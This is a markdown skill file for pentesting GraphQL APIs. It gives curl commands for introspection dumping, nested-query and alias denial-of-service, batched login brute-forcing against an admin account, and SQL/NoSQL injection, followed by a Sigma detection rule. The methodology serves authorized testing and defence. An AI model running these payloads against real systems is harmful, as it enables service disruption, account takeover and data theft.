<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: auditing-graphql-security
description: >-
  Audit GraphQL APIs for introspection leaks, query depth attacks, batch query
  abuse, injection via resolvers, and authorization bypass through nested queries.
domain: cybersecurity
subdomain: api-security
tags:
  - graphql
  - api-security
  - introspection
  - query-depth
  - injection
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1190", "T1059.007"]
  owasp-api: ["API3", "API4", "API8"]
  tools: ["curl", "graphql-voyager", "InQL", "burp-suite", "nuclei"]
---

# Auditing GraphQL Security

## Overview

GraphQL introduces unique attack surfaces beyond REST: introspection leaks
expose the full schema, nested queries enable DoS, batch operations bypass
rate limiting, and mutations may allow mass assignment. This skill covers
comprehensive GraphQL security auditing.

## Prerequisites

- Tools: ["curl", "InQL", "burp-suite", "nuclei", "graphql-voyager"]
- Access to the GraphQL endpoint (typically `/graphql` or `/gql`)
- Authorized testing engagement with written scope

## Key Concepts

- **Introspection**: Built-in schema query mechanism — should be disabled in production
- **Query depth**: Nested queries can cause exponential resolver execution
- **Batching**: Multiple operations in a single request bypass per-request limits
- **Field suggestions**: Error messages may leak field names even without introspection
- **Aliases**: Duplicate the same query under different names to amplify operations

## Workflow

### Step 1: Introspection Probing

```bash
# Full introspection query
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name } } type { name kind ofType { name } } } } } }"}' | jq .

# Minimal introspection check
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | jq '.data.__schema.types[].name'

# Test introspection bypass via GET
curl -s "https://target.com/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D" | jq .

# InQL Scanner (Burp extension) for automated schema extraction
# Import schema into GraphQL Voyager for visualization
```

### Step 2: Field and Type Enumeration

```bash
# Enumerate sensitive types
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | \
  jq '.data.__schema.types[] | select(.name | test("User|Admin|Secret|Token|Password|Key"; "i"))'

# Field suggestion exploitation (typo to trigger suggestions)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { email } }"}' | jq '.errors[].message'

# Enumerate mutations
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}' | jq .
```

### Step 3: Query Depth and Complexity Attack

```bash
# Nested query DoS test (adjust depth to target's limits)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { friends { friends { friends { friends { friends { name email } } } } } } }"}'

# Alias-based amplification
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a1: user(id:1) { email } a2: user(id:2) { email } a3: user(id:3) { email } a4: user(id:4) { email } a5: user(id:5) { email } }"}'

# Fragment spread amplification
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"fragment F on User { email name } { user(id:1) { ...F friends { ...F friends { ...F } } } }"}'
```

### Step 4: Batch Query Abuse

```bash
# Array-based batching (bypasses per-request rate limiting)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { login(email:\"admin@target.com\", password:\"pass1\") { token } }"},
    {"query":"mutation { login(email:\"admin@target.com\", password:\"pass2\") { token } }"},
    {"query":"mutation { login(email:\"admin@target.com\", password:\"pass3\") { token } }"}
  ]'

# Alias-based batching (single query, multiple operations)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { l1: login(email:\"admin@target.com\", password:\"pass1\") { token } l2: login(email:\"admin@target.com\", password:\"pass2\") { token } }"}'
```

### Step 5: Injection via Resolvers

```bash
# SQL injection through GraphQL arguments
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(name: \"admin\\\" OR 1=1--\") { id email } }"}'

# NoSQL injection
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users(filter: \"{\\\"email\\\": {\\\"$gt\\\": \\\"\\\"}}\") { email } }"}'

# Nuclei GraphQL templates
nuclei -u https://target.com/graphql -t http/exposures/apis/graphql-introspection.yaml
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| Introspection queries | API logs | `__schema` or `__type` in query body |
| Deep nested queries | API gateway | Query depth exceeding threshold |
| Batch operations | WAF | Array payloads or alias amplification |
| Resolver errors | App logs | SQL/NoSQL errors from GraphQL resolvers |

```yaml
title: GraphQL Introspection Query Detected
id: c3d4e5f6-a7b8-9012-cdef-345678901234
status: experimental
description: Detects GraphQL introspection queries that expose the full API schema
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains: 'graphql'
  keywords:
    cs-body|contains:
      - '__schema'
      - '__type'
      - 'introspectionQuery'
  condition: selection and keywords
falsepositives:
  - GraphQL development tools like GraphiQL or Apollo Studio in staging
level: medium
tags:
  - attack.t1190
  - attack.initial_access
```

## Verification

- [ ] Introspection state assessed (enabled/disabled)
- [ ] Query depth and complexity limits tested
- [ ] Batch query abuse tested
- [ ] Injection through resolvers tested
- [ ] Authorization on nested resources verified
- [ ] Detection artifacts identified

## References

- [GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [InQL Scanner](https://github.com/doyensec/inql)
- [GraphQL Voyager](https://github.com/graphql-kit/graphql-voyager)
